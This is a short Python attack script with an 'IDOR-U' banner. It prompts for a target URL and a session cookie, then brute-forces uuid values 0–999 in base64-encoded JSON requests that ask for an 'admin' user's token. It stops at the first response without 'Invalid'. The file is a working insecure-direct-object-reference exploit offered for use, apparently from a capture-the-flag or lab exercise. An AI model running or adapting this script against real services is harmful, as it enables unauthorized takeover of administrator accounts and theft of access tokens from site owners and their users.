#!/usr/bin/python3
import requests
import base64
import sys
from tqdm import tqdm

def get_user_input():
    # Prompt user for target URL and session cookie
    print("Example URL: http://example.com/api/endpoint")
    print("Example cookie: .eJw1jkFuxRAMCe_CuqowYAyz6iW6jjC2NaMmE4lkVlXvXqKqO_vJ_v99u8WGHnd3O8as39sdEHfgCIBRhLWjRQKkEoBwThDBEycDblClE2YRbxQDIWAxyspiWYJ1kdo5F_EpqVbE6LuRR-SWtQeowDmnGYiWoUSuLMmiecqBm4GbIq9Dx59NpTRBP4Yt5_6lz0tw5gszNU0CqTCVSp17VFHfk--5kYcYriDd2mOdL6zr2j7uJ7_3fZt87KtO_Dlrjrledc-26f-l-_kFAzlTGQ.ZhiCJg.toSemuYqW-WX0xa2RVTcXW8Ph7w\n")
    target_url = input("Enter the target URL: ")
    session_cookie = input("Enter the session cookie: ")
    return target_url, session_cookie

def main():
    print("""

>=> >====>         >===>      >======>            >=>     >=> 
>=> >=>   >=>    >=>    >=>   >=>    >=>          >=>     >=> 
>=> >=>    >=> >=>        >=> >=>    >=>          >=>     >=> 
>=> >=>    >=> >=>        >=> >> >==>      >====> >=>     >=> 
>=> >=>    >=> >=>        >=> >=>  >=>            >=>     >=> 
>=> >=>   >=>    >=>     >=>  >=>    >=>          >=>     >=> 
>=> >====>         >===>      >=>      >=>          >====>    
                                                              

    """)
    print("Please provide the target URL and session cookie.\n")

    target_url, session_cookie = get_user_input()

    cookies = {"session": session_cookie}
    headers = {"Content-Type": "application/json"}

    # Add a line space
    print()

    # Initialize tqdm with the total number of iterations
    pbar = tqdm(total=1000)

    for uuid in range(1000):
        data = '{"get_token": "True", "uuid": "%d", "username": "admin"}' % uuid
        json_data = {"data": base64.b64encode(data.encode()).decode()}

        request = requests.post(target_url, headers=headers, cookies=cookies, json=json_data)
        pbar.update(1)  # Update progress bar

        if "Invalid" not in request.text:
            print(request.text.strip())
            pbar.close()  # Close progress bar before exiting
            sys.exit(0)

    # Close progress bar after loop completes
    pbar.close()

if __name__ == "__main__":
    main()
